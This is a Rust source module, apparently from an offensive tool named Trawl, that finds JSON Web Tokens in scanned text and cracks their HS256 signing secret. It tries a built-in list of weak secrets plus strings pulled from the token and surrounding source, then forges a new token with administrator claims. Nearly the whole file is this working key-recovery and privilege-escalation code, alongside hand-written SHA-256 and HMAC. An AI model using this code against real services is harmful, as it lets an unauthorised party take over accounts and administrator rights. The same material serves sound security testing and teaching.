//! JSON Web Tokens: reading them, recovering the key, and forging a new one.
//!
//! A JWT is three base64url parts joined by dots: a header, a payload of claims,
//! and a signature over the first two. The signature is what stops a client from
//! editing its own claims, and an HS256 token signs it with HMAC-SHA256 under a
//! secret the server holds. The attack is always the same: get the secret, and
//! the token is yours to rewrite.
//!
//! The secret leaks more often than it should. A weak one falls to a short
//! wordlist, and a careless site sometimes hands it out in the token's own
//! payload or in a script. Either way there is no guessing at the end: a
//! candidate is the real key only when its HMAC over the token's own input
//! reproduces the token's own signature. That check is exact, so a wrong key is
//! never mistaken for the right one, and once the right one is found a fresh
//! token with `role: admin` is a few lines of the same arithmetic run forward.
//!
//! SHA-256 and HMAC are written out here, the same rule the rest of Trawl keeps:
//! nothing borrowed.

const H0: [u32; 8] = [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
];

const K: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

/// SHA-256 of a message, the 32-byte digest.
pub fn sha256(message: &[u8]) -> [u8; 32] {
    let mut h = H0;

    let mut data = message.to_vec();
    let bit_len = (message.len() as u64).wrapping_mul(8);
    data.push(0x80);
    while data.len() % 64 != 56 {
        data.push(0);
    }
    data.extend_from_slice(&bit_len.to_be_bytes());

    for block in data.chunks(64) {
        let mut w = [0u32; 64];
        for (i, word) in w.iter_mut().enumerate().take(16) {
            *word = u32::from_be_bytes([
                block[4 * i],
                block[4 * i + 1],
                block[4 * i + 2],
                block[4 * i + 3],
            ]);
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16]
                .wrapping_add(s0)
                .wrapping_add(w[i - 7])
                .wrapping_add(s1);
        }

        let mut a = h[0];
        let mut b = h[1];
        let mut c = h[2];
        let mut d = h[3];
        let mut e = h[4];
        let mut f = h[5];
        let mut g = h[6];
        let mut hh = h[7];

        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ ((!e) & g);
            let temp1 = hh
                .wrapping_add(s1)
                .wrapping_add(ch)
                .wrapping_add(K[i])
                .wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let temp2 = s0.wrapping_add(maj);

            hh = g;
            g = f;
            f = e;
            e = d.wrapping_add(temp1);
            d = c;
            c = b;
            b = a;
            a = temp1.wrapping_add(temp2);
        }

        h[0] = h[0].wrapping_add(a);
        h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c);
        h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e);
        h[5] = h[5].wrapping_add(f);
        h[6] = h[6].wrapping_add(g);
        h[7] = h[7].wrapping_add(hh);
    }

    let mut out = [0u8; 32];
    for (i, word) in h.iter().enumerate() {
        out[4 * i..4 * i + 4].copy_from_slice(&word.to_be_bytes());
    }
    out
}

const BLOCK: usize = 64;

/// HMAC-SHA256, the construction JWT's HS256 signs with.
pub fn hmac_sha256(key: &[u8], message: &[u8]) -> [u8; 32] {
    let mut block_key = [0u8; BLOCK];
    if key.len() > BLOCK {
        block_key[..32].copy_from_slice(&sha256(key));
    } else {
        block_key[..key.len()].copy_from_slice(key);
    }

    let mut inner = Vec::with_capacity(BLOCK + message.len());
    let mut outer = Vec::with_capacity(BLOCK + 32);
    for &byte in &block_key {
        inner.push(byte ^ 0x36);
        outer.push(byte ^ 0x5c);
    }
    inner.extend_from_slice(message);
    let inner_hash = sha256(&inner);
    outer.extend_from_slice(&inner_hash);
    sha256(&outer)
}

const B64URL: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
const B64STD: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn b64url_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let mut packed = 0u32;
        for (i, &byte) in chunk.iter().enumerate() {
            packed |= (byte as u32) << (16 - 8 * i);
        }
        for i in 0..=chunk.len() {
            out.push(B64URL[((packed >> (18 - 6 * i)) & 63) as usize] as char);
        }
    }
    out
}

fn b64_decode(text: &[u8], alphabet: &[u8]) -> Option<Vec<u8>> {
    let body: Vec<u8> = text.iter().copied().take_while(|&b| b != b'=').collect();
    let mut out = Vec::with_capacity(body.len() * 3 / 4);
    let mut acc = 0u32;
    let mut bits = 0u32;
    for &byte in &body {
        let value = alphabet.iter().position(|&c| c == byte)? as u32;
        acc = (acc << 6) | value;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

/// Decodes a base64 run, whichever alphabet it used.
fn any_base64(text: &[u8]) -> Option<Vec<u8>> {
    b64_decode(text, B64STD).or_else(|| b64_decode(text, B64URL))
}

/// A parsed token: the two signed halves, the signature, and the input they were
/// signed over, which is all a key check needs.
pub struct Token {
    pub header_b64: String,
    pub payload: Vec<u8>,
    pub signing_input: String,
    pub signature: Vec<u8>,
}

/// Reads a token into its parts, or returns nothing when it is not an HS256 JWT.
pub fn parse(token: &str) -> Option<Token> {
    let mut parts = token.split('.');
    let header_b64 = parts.next()?;
    let payload_b64 = parts.next()?;
    let signature_b64 = parts.next()?;
    if parts.next().is_some() {
        return None;
    }

    let header = b64_decode(header_b64.as_bytes(), B64URL)?;
    let header = String::from_utf8_lossy(&header);
    // Only the HMAC family is forgeable this way; RS256 needs a private key.
    if !header.contains("HS256") {
        return None;
    }

    let payload = b64_decode(payload_b64.as_bytes(), B64URL)?;
    let signature = b64_decode(signature_b64.as_bytes(), B64URL)?;

    Some(Token {
        header_b64: header_b64.to_string(),
        payload,
        signing_input: format!("{header_b64}.{payload_b64}"),
        signature,
    })
}

fn is_token_char(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.')
}

/// Every JWT-shaped string in a run of bytes. A JWT is three base64url runs
/// joined by dots, and an HS256 header base64url-encodes to something starting
/// `eyJ`, so that prefix is where each search begins.
pub fn find_tokens(text: &[u8]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut i = 0;
    while i + 3 <= text.len() {
        if &text[i..i + 3] == b"eyJ" {
            let start = i;
            let mut end = i;
            while end < text.len() && is_token_char(text[end]) {
                end += 1;
            }
            if let Ok(candidate) = core::str::from_utf8(&text[start..end])
                && candidate.split('.').count() == 3
                && parse(candidate).is_some()
                && !out.contains(&candidate.to_string())
            {
                out.push(candidate.to_string());
            }
            i = end;
        } else {
            i += 1;
        }
    }
    out
}

/// Weak HS256 secrets worth trying before anything else, the ones a tutorial or
/// a hurried deploy tends to leave in place.
const WEAK_SECRETS: &[&str] = &[
    "secret",
    "password",
    "changeme",
    "admin",
    "key",
    "jwt",
    "token",
    "your-256-bit-secret",
    "supersecret",
    "secretkey",
    "s3cr3t",
    "12345678",
    "qwerty",
];

const MAX_KEYS: usize = 128;

fn push_key(into: &mut Vec<Vec<u8>>, key: Vec<u8>) {
    if !key.is_empty() && into.len() < MAX_KEYS && !into.contains(&key) {
        into.push(key);
    }
}

/// Keys worth checking against a token: the plain and decoded forms of every
/// long-ish run in its own payload, the same out of the source it was found in,
/// and the weak-secret list. A leaked `signing_key_b64` lands here as its decoded
/// bytes; a weak secret lands here from the list.
pub fn candidate_keys(token: &Token, source: &[u8]) -> Vec<Vec<u8>> {
    let mut keys: Vec<Vec<u8>> = Vec::new();

    for secret in WEAK_SECRETS {
        push_key(&mut keys, secret.as_bytes().to_vec());
    }

    for haystack in [token.payload.as_slice(), source] {
        for run in runs(haystack, |b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'-' | b'_' | b'='), 8) {
            // The run itself, in case the secret is stored as plain text.
            push_key(&mut keys, run.to_vec());
            // And decoded, in case it was base64 of the real bytes.
            if let Some(decoded) = any_base64(run) {
                push_key(&mut keys, decoded);
            }
        }
    }

    keys
}

/// Maximal runs of bytes that all satisfy `keep`, each at least `min` long.
fn runs(data: &[u8], keep: impl Fn(u8) -> bool, min: usize) -> Vec<&[u8]> {
    let mut out = Vec::new();
    let mut start = None;
    for (i, &byte) in data.iter().enumerate() {
        match (keep(byte), start) {
            (true, None) => start = Some(i),
            (false, Some(s)) => {
                if i - s >= min {
                    out.push(&data[s..i]);
                }
                start = None;
            }
            _ => {}
        }
    }
    if let Some(s) = start
        && data.len() - s >= min
    {
        out.push(&data[s..]);
    }
    out
}

/// The key that actually signed this token, found by the one test that cannot be
/// fooled: its HMAC over the token's own input equals the token's own signature.
pub fn recover_key(token: &Token, candidates: &[Vec<u8>]) -> Option<Vec<u8>> {
    candidates
        .iter()
        .find(|key| hmac_sha256(key, token.signing_input.as_bytes()) == token.signature.as_slice())
        .cloned()
}

/// A fresh token with the claims a server checks for an administrator, signed
/// with the recovered key and the token's own header, so it verifies exactly as
/// the real one did.
pub fn forge_admin(token: &Token, key: &[u8]) -> String {
    let payload = String::from_utf8_lossy(&token.payload);
    let base = payload.trim().trim_end_matches('}');
    let separator = if base.trim_end().ends_with('{') { "" } else { "," };
    let escalated = format!(
        "{base}{separator}\"role\":\"admin\",\"admin\":true,\"is_admin\":true,\"isAdmin\":true}}"
    );

    let payload_b64 = b64url_encode(escalated.as_bytes());
    let signing_input = format!("{}.{payload_b64}", token.header_b64);
    let signature = hmac_sha256(key, signing_input.as_bytes());
    format!("{signing_input}.{}", b64url_encode(&signature))
}

#[cfg(test)]
mod tests;
